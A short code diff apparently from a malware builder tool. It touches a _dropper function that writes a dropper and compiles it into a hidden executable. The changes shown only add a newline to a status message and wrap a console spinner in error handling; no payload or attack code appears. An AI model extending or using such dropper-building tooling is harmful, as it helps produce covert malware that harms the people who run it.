@@ -406,7 +406,7 @@ def _dropper(options, **kwargs):
         fp.write(dropper)
 
     if options.freeze:
-        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
+        util.display('\tCompiling executable... \n', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
@@ -419,11 +419,14 @@ def _dropper(options, **kwargs):
 def _spinner(flag):
     spinner = itertools.cycle(['-', '/', '|', '\\'])
     while not flag.is_set():
-        sys.stdout.write(next(spinner))
-        sys.stdout.flush()
-        flag.wait(0.2)
-        sys.stdout.write('\b')
-        sys.stdout.flush()
+        try:
+            sys.stdout.write(next(spinner))
+            sys.stdout.flush()
+            flag.wait(0.2)
+            sys.stdout.write('\b')
+            sys.stdout.flush()
+        except:
+            break
 
 if __name__ == '__main__':
     main()
